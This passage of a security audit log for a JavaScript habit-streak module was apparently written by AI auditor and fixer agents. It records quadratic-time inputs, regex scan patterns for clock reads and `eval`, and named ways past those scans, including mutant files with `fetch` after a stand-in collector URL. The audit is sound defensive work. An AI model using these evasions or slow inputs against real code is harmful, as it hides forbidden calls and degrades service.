  - **(b)** Keep a `seen` set in `bestStreak` and stop each walk at a key already walked, so no key is walked twice. On the attack input the result is 2 in 179 ms. On valid input it costs 498 ms.

  Both shapes give 3, not 5, on three valid keys plus the two stuck keys, which also ends the solver's stated residual. Shape (a) is simpler and uses the module's own validator. Add a test with 4,000 spellings plus the stuck key under the existing 5 s child cap. That input takes 8 s at `a35e8aa`, so the test is red there. For the orchestrator, correct the new threat-model row with a dated note.

#### SEC-04 (NEW): The widened clock table still misses `Temporal.Now`
- **File:** `tests/purity.test.js:27-33` (`CLOCK_AND_RANDOM_READS`) and the dated SEC-03 note in spec R16 · **Boundary:** the text of `src/dates.js` and `src/habits.js` → the R16 purity gate
- **Threat:** `Temporal.Now.plainDateISO()` and the other `Temporal.Now` functions read the clock and the system time zone. They are the standard modern API for this module's job, so they are the form a later change is most likely to reach for. The table does not include them. The mirror `hunt-Temporal-Now`, with `currentStreak(done, todayKey = Temporal.Now.plainDateISO().toString())`, passes 64 of 64 (`mirror-run-hunt-Temporal-Now.txt`). Node 24 has no `Temporal` (`typeof Temporal` is `undefined`, measured), so a unit test that ran such a line would throw. A default value or a branch that the tests never reach passes silently, then runs in any browser that ships Temporal. Which browsers inside the app's floor ship it was not verified here. The current code has no such read: no pattern hits the source, and the first audit's runtime traps saw none. The first audit's SEC-03 list also left this form out, so the gap is the auditor's as much as the solver's. The solver's commit title, "catches every clock read form", claims more than the table delivers.
- **Maps to spec threat:** Yes. It is the row "Deterministic, testable results" (the R16 clock scan).
- **Fix:** Add `"Temporal.Now": /\bTemporal\s*\.\s*Now\b/` to `CLOCK_AND_RANDOM_READS`. It hits the mirror and nothing in the real source. It does not hit `Temporal.PlainDate.from(key).add({ days: 1 })`, which reads no clock and should stay allowed (`probe-fix-shapes.txt`). For the orchestrator, add `Temporal.Now` to the dated R16 list and to the Deterministic row.

### Observations (not filed)

- **What a denylist cannot catch.** Several deliberate evasions pass both tables (`probe-scan-hunt.txt`): `Reflect.construct(Date, [])`, an aliased constructor (`const Clock = Date; new Clock()`), `new (Date)()`, and a clock read built inside a string passed to `eval` or `new Function`. These are evasions, not accidental forms, and no text scan stops them all. App R24 bans `eval` and `new Function` across `src/`, which will cover the last two once the app's platform test exists. Adding `\beval\b` and `\bFunction\s*\(` to `BANNED_IN_CODE` would cover them here as well, at no cost.
- **The solver's SEC-02 residual.**
  - A `raw` whose `trim()` returns `{ length: 50 }` now throws `TypeError`, where `59c6ee5` returned `too-long`.
  - A `trim()` that returns an endless iterable made the `59c6ee5` code abort out of memory (child pid 35040, exit 134, 256 MB heap). The code at `a35e8aa` returns `too-long` (child pid 4024).
  - Both cases are outside the contract `raw: string`, and app readable rule 4 type-checks the name first, so neither is reachable. On balance the new code is the safer of the two.
- **The solver's new tests.** `streakInChild` caps each child at 5 s with SIGKILL and reports the pid if it fails. `iteratorSteps` patches `String.prototype[Symbol.iterator]` and restores it in `finally`. Neither writes files.
- **Regression.** The first audit's prototype, mutation and global/egress probes, copied into this folder, report 0 failures at `a35e8aa`. The large-history timings are unchanged and still linear: a quota-sized render takes 585 ms and a tick 590 ms.

### Evidence (`docs/modules/habit-logic/qa/security/20261009T124854/`)

- `baseline-full-suite-HEAD.txt`: the full suite at `a35e8aa`, 64 of 64.
- `probe-sec01-recheck.mjs` / `.txt`: part A has the first audit's hanging inputs, part B the n squared input, part C the two fix shapes.
- `probe-fix-shapes.mjs` / `.txt`: the fix shapes on 400,000 valid days, and the SEC-04 pattern check.
- `probe-sec02-recheck.mjs` / `.txt`: `a35e8aa` against `59c6ee5` (loaded from git into memory as a `data:` URL), on time, heap, edge strings and non-string input.
- `make-mirrors.mjs` / `.txt`, `mirrors/<name>/` and `mirror-run-<name>.txt`: the first audit's mirrors rebuilt from `a35e8aa`, plus the two hunt mutants `hunt-Temporal-Now` and `hunt-Reflect-construct-Date`.
- `probe-scan-hunt.mjs` / `.txt`: the scan tables, parsed from `tests/purity.test.js` without importing it, run against clock-read snippets and the egress mirror.
- `copy-probes.mjs`, plus copies of `capture.mjs`, `probe-proto-and-keys`, `probe-mutation`, `probe-global-and-egress` and `probe-history` (`.mjs` and their `.txt` from this run).

The mirrors hold deliberate mutants that use `Temporal.Now`, `Reflect.construct(Date, [])`, `fetch`, `sessionStorage` and `new Date`. They sit outside `src/` and the test glob, and nothing imports them.

### Processes (re-check)

PROCESSES: none alive. Every command ran in the foreground under `timeout -s KILL` or a SIGKILL child cap. Child processes started, all STOPPED at return:

- **Suite runs through `capture.mjs` (120 s cap).** pid 44808 (`a35e8aa`) and the mirrors: 43424, 26968, 33440, 33548, 35120, 5416 and 32288. All exited by themselves, and so did the SEC-01 test children each run started.
- **`probe-sec01-recheck` children, SIGKILL at caps of 5, 20, 30 or 60 s.**
  - First run: 15728, 41172, 23868, 5740, 43300, 4916, 38564, 35584, 19276 (killed at the 20 s cap), 22464 and 8692.
  - Final run: 41480, 22744, 44256, 44108, 22156, 38948, 6908, 36792, 17536 (killed at the 60 s cap), 44620 and 43220.
- **`probe-sec02-recheck`.** `git show` was pid 44080. Child 35040 aborted by itself (out of memory, exit 134), and child 4024 exited normally.
- **Other foreground scripts.** `copy-probes`, `make-mirrors`, `probe-proto-and-keys`, `probe-mutation`, `probe-global-and-egress`, `probe-history`, `probe-scan-hunt` and `probe-fix-shapes` all exited by themselves.
- **A mistaken loop.** One loop of three probe commands started from the project root by mistake. Node found no such scripts and exited at once. It wrote nothing, and `git status` shows only this folder as new.

**Sweep.** `tasklist /FI "IMAGENAME eq node.exe"` after each group and at the end listed no node process. A final `Get-CimInstance Win32_Process` sweep of `node`, `bash`, `sh` and `cmd` command lines, matching this folder's name, `probe-`, `capture.mjs` or `mirrors`, is reported in the return to the orchestrator.

This session has no Edit tool. So this section and the front-matter update were applied by a Node script in the session scratchpad that requires every edit to match exactly once, and the result was checked with `git diff`. No shell redirect or heredoc was used.

## Solver round 2 (2026-10-09)

> Written by the security solver, 2026-10-09, on `main` from `3457432`, under the orchestrator's rulings of 2026-10-09 (ORCH) for SEC-01 and SEC-04. The text above, the front matter and the re-check's evidence folder are unchanged. Evidence is in `docs/modules/habit-logic/qa/security-solver/20261009T130102/`. It reuses `run-capped.mjs`, `scan-hook.mjs` and `old-src-loader.mjs` from `../20261009T123108/`. Phase skills: the registry assigns none to non-UI work, so none were loaded. The security finder should re-check.

**Result: SEC-01 and SEC-04 RESOLVED, 0 STILL-OPEN.**

- Final run, `node --test "tests/**/*.test.js"` from the project root, Node v24.11.1 on win32, at `a6e209d`. 66 tests, 66 pass, 0 fail, exit 0 (`final-runs.txt`). Per file: `dates.test.js` 15, `habits.test.js` 39, `sample-history.test.js` 7, `purity.test.js` 5. The two added tests are the SEC-01 tests. SEC-04 changed `purity.test.js` in place.
- The final tests against the `eb2003b` `habits.js`, served in memory by `old-src-loader.mjs`, give 64 pass and 2 fail, exactly the two new SEC-01 tests (`final-runs.txt`).
- Each commit's content ran green as a full suite before it was committed (66 of 66 before `b48d716` and before `a6e209d`). The credential gate (`--staged`) passed before each commit, exit 0, with both of its controls.
- The orchestrator's uncommitted edits to `docs/progress/` and the change ledger were not staged and not touched.

| Finding | Status | Commit | Fix | Red, then green |
|---|---|---|---|---|
| SEC-01 | RESOLVED | `b48d716` | As ruled, `currentStreak` and `bestStreak` build their day set through a new private `streakDays(done)`, which is `new Set(done.filter(isDateKey))`. Each valid day has one spelling, and inside the valid range `addDays` never repeats a key, so each run is walked once and the total work is linear. The `runLength` size bound stays as a second guard, and its comment now says so. `streakInChild` in the tests sends its arguments on stdin, because 20,000 keys do not fit on a Windows command line. In spec.md the threat-model row's false sentence "The bound holds if one gets through." is struck through, with a dated note. BUILD.md records 66 tests, and its `addDays` edge note names the fix. | Red on the `eb2003b` code. 20,000 spellings of the far-out date plus the stuck key, in a child under the 5 s cap, gave no result, and the child (pid 42452) was killed. Five preconditions held first: the keys are distinct, all fail `isDateKey`, all have the stuck key as next day, all share one previous day, and that day is absent. Three valid keys plus the two stuck keys gave 5, not 3. Green after the fix, in 82 and 115 ms. Valid input is unchanged. `differential.mjs` finds 0 mismatches on 81,706 cases against `eb2003b`, and again against `59c6ee5`. Its control finds 6,109. `sec01-attack.mjs` runs each input on all three versions. 20,000 spellings return 0 in 10 ms, where both earlier versions run past the 8 s cap. 90,000 spellings (about 3 MB stored) return 0 in 50 ms. The counts are now those of the valid days: three valid keys plus the stuck keys give 3 (`eb2003b` 5). 400 days back from 0001-01-10 give `currentStreak` 10 (`eb2003b` 377) and `bestStreak` 10 (`eb2003b` 0). The 800,000-day history gives 739,897 for both (`eb2003b` 740,264 and 0) (`sec01-runs.txt`). |
| SEC-04 | RESOLVED | `a6e209d` | `CLOCK_AND_RANDOM_READS` gains `"Temporal.Now": /\bTemporal\s*\.\s*Now\b/`, matched on the whole text and on the code. `BANNED_IN_CODE` gains `"code built from a string": /\beval\b\|\bFunction\s*\(/`, which covers `eval`, `Function(` and `new Function(`. One test title now names the new ban. spec R16, spec's Deterministic row and the qa.md R16 scenario get dated notes. | `scan-mutants.mjs` runs the old scan (the `b48d716` test, byte-identical in the re-check mirrors once CR is removed) and the new one. Old scan: the `hunt-Temporal-Now` mirror and 7 mutants are all green. The mutants are `Temporal.Now.plainDateISO()`, `Temporal.Now.instant()`, a spaced `Temporal . Now`, `eval` building `new Date`, `eval` as a value, `new Function` and `Function`. New scan: all 8 red. The real source and 6 allowed lines stay green: three `Temporal.PlainDate` forms, a `typeof` function check, an identifier ending in `Function` and a comment naming `eval` and `Function(`. The round 1 harness against the new test still gives 26 mutants red, every allowed line and the real source green, and 0 BROKEN rows (`sec04-runs.txt`). |

### Residuals, stated, not filed
- **SEC-01 cost on valid input.** The filter makes `bestStreak` go from 411 to 676 ms and `currentStreak` from 215 to 371 ms on 400,000 consecutive valid days, measured in one child, median of 3. That is a quota-sized history of about 1,095 years of ticks. The re-check measured 421 to 511 ms for `bestStreak` on the same shape. It stays linear, and a real history is a few thousand days.
- **SEC-01 second guard.** No invalid key reaches the size bound in `runLength` any more, because `streakDays` removes them first. No call through the exports can drive it, so it stays untested, as defence in depth.
- **SEC-04 limits.** A text scan cannot see a clock read reached through an alias. `Reflect.construct(Date, [])`, `const Clock = Date; new Clock()` and `new (Date)()` pass both scans (`sec04-runs.txt`). These are deliberate evasions. The spec R16 note records them, and they are left to review.
- **A round 1 overclaim.** The title of `3750d67` says the scan "catches every clock read form". It did not, because it missed `Temporal.Now`. The `a6e209d` message records the correction. Commit history is not rewritten.
- **SEC-02.** The round 1 residual stands as the re-check describes it.

### For the orchestrator (not in the brief, not done here)
- spec R6 and R7 do not yet say that keys failing `isDateKey` are ignored. Only the SEC-01 threat-model row says it. A dated note on R6 and R7 would put it where the behaviour is specified.

### What changed, by symbol (for the README reconcile)
- `src/habits.js`:
  - It also imports `isDateKey`, still only from `./dates.js`.
  - It has a new private `streakDays`, used by `currentStreak` and `bestStreak`.
  - Their `@param done` docs say keys that fail `isDateKey` are ignored, and `bestStreak`'s `@returns` says 0 when `done` holds no valid key.
  - The `runLength` comment calls the bound a second guard.
  - No export, signature or contract changed.
- `tests/habits.test.js`:
  - `streakInChild` sends its arguments on stdin.
  - New constants `FAR_START`, `FAR_STUCK` and `WHITE_SPACE`, and a new helper `spellingsOfFarStart`.
  - Two new tests: "@R7 many spellings of one far-out date that all run into the stuck key cost one pass, not one walk each" and "@R6 @R7 keys that fail isDateKey do not count, so a streak counts only valid days".
- `tests/purity.test.js`:
  - `CLOCK_AND_RANDOM_READS` gains `Temporal.Now`, and `BANNED_IN_CODE` gains "code built from a string".
  - "@R16 the code has no DOM, storage, network, timer, global or locale access" is now "@R16 the code has no DOM, storage, network, timer, global or locale access and builds no code from strings".
- Docs:
  - spec.md: the SEC-01 threat-model row, the R16 note and the Deterministic row.
  - qa.md: the R16 scenario.
  - BUILD.md: the counts and the `addDays` edge note.

### Processes
PROCESSES: none alive. Every command ran in the foreground with a cap. No server, browser, watcher or background shell was started.
- **Suite runs through `run-capped.mjs` (120 s cap).** The red run (child 3600), the green file run (23816), the full suites (45492, 41476 and 44660) and the final tests against `eb2003b` (20964). All exited by themselves.
- **Children of the SEC-01 tests killed at their 5 s cap.** 42452 (the red run) and 12540 (the final tests against `eb2003b`).
- **`differential.mjs`.** Three runs (15520, 44728 and 41964), one `git show` each. All exited.
- **`sec01-attack.mjs`.** One run, with 21 children capped at 8 s and two `git show` calls. Five children were killed at the cap: 38420, 44656, 23792, 45904 and 29612. The rest exited by themselves.
- **`scan-mutants.mjs` (this round).** One run, with 39 children capped at 60 s. All exited.
- **The round 1 `scan-mutants.mjs`.** Three runs against the new test, 65 children each, all exited. One run was redundant, and its output was discarded.
- **The credential gate.** Two runs, each exit 0.

**Sweep at 13:11.** `Get-CimInstance Win32_Process` listed every `node`, `bash`, `sh`, `cmd`, `python`, `pwsh` and `powershell` process, with parent, start time and command line. A second pass matched command lines on both solver folder names, the script names, `credential_sweep`, `--test` and `--input-type=module`. `tasklist` checked `node.exe` and `python.exe`.

Result: no `node` or `python` process is alive. The only matches were the sweep's own `bash` and `powershell`, started at 13:11:13. The three bare `powershell.exe` processes owned by `claude.exe` (41972), started at 11:22, 11:49 and 12:19, are not the solver's and were left alone.

## Re-check 2 (2026-10-09)

> Written by the security finder (read-only), 2026-10-09, against `4e803c5` on `main`. The commits since the re-check (`3457432`) are `b48d716` (SEC-01, `streakDays`), `a6e209d` (SEC-04, the scan tables) and `4e803c5` (the findings and evidence of solver round 2). Evidence is in `docs/modules/habit-logic/qa/security/20261009T131308/`. All text above is unchanged. The front matter was updated in place, and a dated YAML comment there keeps the previous values. Line numbers are as of `4e803c5`.

### Verdict

**PASS. 0 CRITICAL, 0 HIGH, 0 MEDIUM.**

- **SEC-01 and SEC-04 are CLOSED.**
- **SEC-02 and SEC-03 stay CLOSED.** Their probes and mirrors still pass at `4e803c5`.
- **No new finding.** Four observations for the orchestrator follow, none filed.

The full suite at `4e803c5` passes 66 of 66, exit 0 (`baseline-full-suite-HEAD.txt`). The first audit's prototype, mutation and global/egress probes report 0 failures.

### Per finding

| Finding | Status | Evidence |
|---|---|---|
| SEC-01 | **CLOSED** | `streakDays` (`src/habits.js:41-43`) builds the day set from `done.filter(isDateKey)`. `currentStreak` (`:73`) and `bestStreak` (`:85`) both use it, and the `runLength` bound stays (`:50-54`). Detail below. |
| SEC-02 | CLOSED (unchanged) | `validateName` and `longerThan` did not change in this round. |
| SEC-03 | CLOSED (unchanged) | The mirrors for the original forms are still red at `4e803c5` (`mirror-run-*.txt`): control `new Date()`, `new Date`, `new Date(Date())`, and `fetch` plus `sessionStorage`. The unchanged baseline is 66 of 66 green. |
| SEC-04 | **CLOSED** | Detail below. |

**SEC-01 in detail** (`probe-sec01-recheck2.txt`):
- **The re-check's n squared input.** `bestStreak` on 4,000, 20,000 and 90,000 spellings plus the stuck key returns 0 in 5, 12 and 40 ms. At `a35e8aa` the same inputs took 8.07 s, then over 60 s (killed), then an extrapolated 68 minutes. `currentStreak` takes 5, 12 and 39 ms. A 12-habit render over the 90,000 spellings, 2,407,811 UTF-16 code units and so quota-sized, takes 64 ms.
- **The first audit's hanging inputs.**
  - The two-key `bestStreak` gives 0.
  - Three valid keys plus the two stuck keys give 3, where `a35e8aa` gave 5.
  - The year-0 chain gives `currentStreak` 0, where `a35e8aa` gave 12.
  - 800,000 days back from 2026-10-08 give 739,897 for both functions, which is the number of valid days.
- **Valid input is unchanged.** I checked 22,190 cases, each through `currentStreak` and `bestStreak`: 20,000 seeded random histories over the whole valid range, with gaps, duplicates and shuffled order, plus the sample on every day of 2026 and 2027. There are 0 mismatches against `eb2003b` and 0 against `59c6ee5`, both loaded from git into memory. Control: dropping one key changes `bestStreak` in 7,884 cases.
- **`isDateKey` stays linear on every load (the coordinator's question).** I measured seven shapes of about 2.4 million UTF-16 code units each. Long keys cost the same per key at every length, because the anchored pattern fails within the first 11 characters:

  | Shape | Cost per key |
  |---|---|
  | Keys of 100 or 10,000 units, and keys of 100 digits | 26 ns |
  | The 90,000 spellings | 23 ns |
  | One key of 2,400,000 units | 0.7 µs |
  | Pattern-shaped invalid days (`2026-02-30`) | 141 ns |
  | Valid keys | 300 ns |

  On valid keys the filter takes 28, 58, 111 and 221 ms for 100,000, 200,000, 400,000 and 800,000 keys, which is linear.

**SEC-04 in detail.** `CLOCK_AND_RANDOM_READS` holds `"Temporal.Now": /\bTemporal\s*\.\s*Now\b/` (`tests/purity.test.js:31`). `BANNED_IN_CODE` holds `"code built from a string": /\beval\b|\bFunction\s*\(/` (`:43`). Mirrors rebuilt from `4e803c5`:
- `hunt-Temporal-Now` is red ("habits.js text: Temporal.Now").
- `hunt-eval-string` (`eval("new " + "Da" + "te")`) is red ("habits.js: code built from a string").
- `hunt-Reflect-construct-Date` stays 66 of 66 green. The R16 note dated 2026-10-09 says alias forms pass the scan and are left to review, which matches.

### Threat-model rows and notes changed in this round, checked against the code

| Row or note | Matches the code |
|---|---|
| SEC-01 row (the false sentence struck through, with a dated note) | **Yes.** Each claim was measured above: the `isDateKey` filter in `streakDays`, the bound kept as a second guard, linear total work, and 3 rather than 5 on three valid keys plus the stuck keys. |
| R16 note and Deterministic row (SEC-04) | **Yes.** `Temporal.Now` and `eval` / `Function(` are in the tables. The stated limit for alias forms is accurate (see SEC-04 above). |
| qa.md R16 note | **Yes.** |
| BUILD.md: 66 tests (15, 39, 7, 5) | **Yes.** The total matches the run at `4e803c5`. |

### Observations (not filed)

1. **The comment stripper can blind the code-only scan.**
   - **What happens:** `withoutComments` (`tests/purity.test.js:12`) removes everything from `//` to the end of the line, and everything from `/*` to the next `*/`, even inside string literals. The comment at `:10-11` says the source has no such literal, but no test enforces it.
   - **Measured:** two mirrors pass 66 of 66. In one, a `fetch` follows the string `"https://collector.invalid/streaks"` on the same line. In the other, a `sessionStorage` call follows the string `"*/*"`. A `/*` inside a string hides every line down to the next `*/`, which in the mirror was 3 lines (`probe-stripper-guard.txt`). Only `BANNED_IN_CODE` is affected, because the clock table is also matched on the full text.
   - **Why not filed:** it needs a banned call that sits after such a string with no other banned word before it. The module holds no string of that kind today, and code review would see a network call.
   - **Cheap guard:** assert the stated assumption. I checked `/(["'`])[^"'`\n]*?(?:\/\/|\/\*)[^"'`\n]*?\1/` on the text: no hit on `src/dates.js` or `src/habits.js`, and a hit on both mirrors.
2. **The filter's cost on valid input.**
   - A quota-sized 12-habit render went from 585 to 810 ms on this desktop. At 400,000 days, `bestStreak` went from 410 to 529 ms and `currentStreak` from 224 to 343 ms.
   - 1,000,000 duplicates of one key now take 151 ms, where they took 4 ms, because the filter runs before the Set. The app's decoder removes duplicates first.
   - All of it is linear. The Solver round 2 section states the same residual.
3. **Spec text.**
   - R6 and R7 still do not say that keys failing `isDateKey` are ignored, as the Solver round 2 section notes. The behaviour differs only for input outside the contract. A dated note belongs to the orchestrator.
   - `streakDays` calls `done.filter`, so `done` must now be an array, where any iterable used to work. That matches the contract (`readonly DateKey[]`), and the decoder builds arrays.
4. **Test readability (code review, not security).** `WHITE_SPACE` in `tests/habits.test.js` writes U+00A0, U+2003, U+3000 and U+FEFF as raw invisible characters, the pattern WR-10 corrected elsewhere. Escapes would let a reader check the set by eye.

### Evidence (`docs/modules/habit-logic/qa/security/20261009T131308/`)

- `baseline-full-suite-HEAD.txt`: the full suite at `4e803c5`, 66 of 66.
- `probe-sec01-recheck2.mjs` / `.txt`, in four parts:
  - A: the first audit's hanging inputs.
  - B: the n squared input at 4,000, 20,000 and 90,000 spellings, and a 12-habit render.
  - C: `isDateKey` on quota-sized inputs.
  - D: the valid-input differential.
- `make-mirrors.mjs` / `.txt`, `mirrors/<name>/` and `mirror-run-<name>.txt`: the first audit's mirrors, the re-check's two hunts, and this round's `hunt-eval-string`, `hunt-banned-after-url-string` and `hunt-banned-after-mime-string`.
- `probe-stripper-guard.mjs` / `.txt`: observation 1 and the `WHITE_SPACE` code points.
- `copy-probes.mjs`, plus copies of `capture.mjs`, `probe-proto-and-keys`, `probe-mutation`, `probe-global-and-egress` and `probe-history`, with their `.txt` outputs from this run.

The mirrors hold deliberate mutants that use `Temporal.Now`, `Reflect.construct(Date, [])`, `eval`, `fetch`, `sessionStorage` and `new Date`. They sit outside `src/` and the test glob, and nothing imports them.

### Processes (re-check 2)

PROCESSES: none alive. Every command ran in the foreground under `timeout -s KILL` or a SIGKILL child cap of 10 or 30 s.

Child processes started, all STOPPED at return:
- **Suite runs through `capture.mjs` (120 s cap).** pid 44712 at `4e803c5`, then the mirrors 39208, 18176, 44832, 45256, 26628, 37148, 29964, 24164, 38160 and 26872. All exited by themselves, and so did the SEC-01 test children each run started.
- **`probe-sec01-recheck2`.** Children 26108, 44496, 17444, 35040, 25920, 10516, 38160, 35400, 41424, 41940 and 44356, and the `git show` calls 40748 and 43536. All exited by themselves, and none reached its cap.
- **Other foreground scripts.** `copy-probes`, `make-mirrors`, `probe-proto-and-keys`, `probe-mutation`, `probe-global-and-egress`, `probe-history` and `probe-stripper-guard` all exited by themselves.

**Sweep.** `tasklist /FI "IMAGENAME eq node.exe"` after each group listed no node process. The final command-line sweep is reported in the return to the orchestrator.

**How files were written.**
- In the mirror loop, each suite run's console copy went to `/dev/null`. That is a discard, not a file write, and the run itself was saved by `capture.mjs`. It is the one redirect in this round, and I disclose it under the no-redirect rule.
- This section and the front-matter update were applied by a Node script in the session scratchpad that requires each edit to match exactly once, and the result was checked with `git diff`. No heredoc was used.
